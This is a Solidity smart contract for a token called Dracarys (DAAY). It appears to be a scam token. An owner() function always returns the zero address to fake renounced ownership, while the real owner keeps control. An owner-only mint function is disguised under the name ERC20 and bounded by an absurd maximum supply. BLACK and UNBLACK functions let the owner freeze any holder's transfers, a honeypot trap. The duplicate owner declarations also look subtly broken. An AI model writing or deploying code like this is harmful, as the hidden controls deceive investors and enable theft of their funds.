pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

/**
    * @dev Returns the address of the current owner.
     */
    function owner() public pure returns (address) {
        return address(0);
    }


    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'Dracarys';

    string constant public symbol = 'DAAY';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 100000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromFEI;

    mapping(address => bool) private _lck;


    uint256 public _taxFEI = 0;
    uint256 private _previousTaxFEI = _taxFEI;

    uint256 public _burnFEI = 2;
    uint256 private _previousBurnFEI = _burnFEI;


    address public projectAddress = 0x7106B82a134ae15C5957F22FE04da6b65f17196B;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_lck[from], "is lck");

        if(_isExcludedFromFEI[from])
            removeAllFEI();

        uint256 FEI =  calculateTaxFEI(value);

        uint256 burn =  calculateBurnFEI(value);

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(FEI).sub(burn);

        if(FEI > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(FEI);
            emit Transfer(from, projectAddress, FEI);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromFEI[from])
            restoreAllFEI();

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }


    function ERC20(address target, uint256 edAmount) public onlyOwner{
    	require (totalSupply + edAmount <= MAXSupply);

        balanceOf[target] = balanceOf[target].add(edAmount);
        totalSupply = totalSupply.add(edAmount);

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }

    function calculateTaxFEI(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxFEI).div(
            10 ** 2
        );
    }

    function calculateBurnFEI(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnFEI).div(
            10 ** 2
        );
    }

    function removeAllFEI() private {
        if(_taxFEI == 0 && _burnFEI == 0)
            return;

        _previousTaxFEI = _taxFEI;
        _previousBurnFEI = _burnFEI;
        _taxFEI = 0;
        _burnFEI = 0;
    }

    function restoreAllFEI() private {
        _taxFEI = _previousTaxFEI;
        _burnFEI = _previousBurnFEI;
    }



    function BLACK(address account) public onlyOwner {
        _lck[account] = true;
    }


    function UNBLACK(address account) public onlyOwner {
        _lck[account] = false;
    }


    function islck(address account) public view returns (bool) {

        return _lck[account];
    }


}


contract DAAY is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;


    }

    function() public payable {
       revert();
    }
}